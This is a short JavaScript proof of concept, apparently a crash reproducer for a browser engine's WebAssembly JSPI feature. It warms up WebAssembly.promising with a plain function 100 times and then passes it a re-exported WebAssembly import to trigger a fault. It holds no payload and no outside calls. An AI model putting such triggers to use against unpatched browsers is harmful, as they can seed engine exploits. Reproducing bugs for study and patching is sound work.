const wasm_code = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 7, 1, 96, 1, 127, 1, 127, 2, 11, 1, 1, 109, 3, 105, 109, 112, 0, 0, 7, 7, 1, 3, 101, 120, 112, 0, 0]);
const wasm_module = new WebAssembly.Module(wasm_code);
const import_object = {
    m: {
        imp: (x) => {
            return x;
        }
    }
};
const instance = new WebAssembly.Instance(wasm_module, import_object);

const trigger_func = instance.exports.exp;
const warmup_func = (x) => {
    return x;
};

function poc(i) {
    let func = warmup_func;
    if (i === 100) {
        func = trigger_func;
    }
    try {
        WebAssembly.promising(func);
    } catch (e) {}
}

for (let i = 0; i <= 100; ++i) {
    poc(i);
}